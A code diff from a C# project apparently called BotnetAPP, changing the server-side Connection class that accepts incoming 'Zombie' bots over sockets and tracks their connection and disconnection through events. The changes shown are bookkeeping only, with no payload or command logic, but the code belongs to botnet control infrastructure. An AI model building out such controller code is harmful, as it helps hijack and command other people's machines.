@@ -27,6 +27,7 @@ namespace BotnetAPP.Network {
         // Event
 
         public event EventConnectionHandler NewConnectedBot;
+        public event EventConnectionHandler NewDisconnectionBot ; 
 
 
         // Thread
@@ -34,6 +35,16 @@ namespace BotnetAPP.Network {
         private Thread _checkingBotDisconnection ; 
 
         private ASCIIEncoding _asen = new ASCIIEncoding();
+
+
+        public Dictionary<Zombie, Socket> GetConnectedBot {
+            get {
+                return _connectedBot ; 
+            }
+        }
+
+
+    // getter et 
 
     public Connection() {
 
@@ -55,8 +66,15 @@ namespace BotnetAPP.Network {
     }
 
 
-    public void OnNewConnectedBot() {
-        NewConnectedBot?.Invoke(this);
+
+
+
+    public void OnNewConnectedBot(Zombie zombie) {
+        NewConnectedBot?.Invoke(zombie);
+    }
+
+    public void OnDisconnectionBot(Zombie zombie) {
+        NewDisconnectionBot?.Invoke(zombie); 
     }
 
     /*
@@ -105,7 +123,8 @@ namespace BotnetAPP.Network {
             }
 
             foreach ( Zombie zb in ZombieLost) {
-                _connectedBot.Remove(zb) ; 
+                _connectedBot.Remove(zb) ;
+                OnDisconnectionBot(zb) ;  
             }
 
             // Une seconde avant chaque vérification 
@@ -132,6 +151,7 @@ namespace BotnetAPP.Network {
 
 
                 while(true) {
+                    
                 listen.Start();
 
                //IPEndPoint remoteIpEndPoint = listen.Client.RemoteEndPoint as IPEndPoint;
@@ -154,7 +174,7 @@ namespace BotnetAPP.Network {
                     if ( GetIncomingMessage(s) == "1" ) {
                         Zombie nvZb = new(s.RemoteEndPoint.ToString()) ; 
                         _connectedBot.Add(nvZb, s) ;
-                        OnNewConnectedBot() ; 
+                        OnNewConnectedBot(nvZb) ; 
                     }
 
 
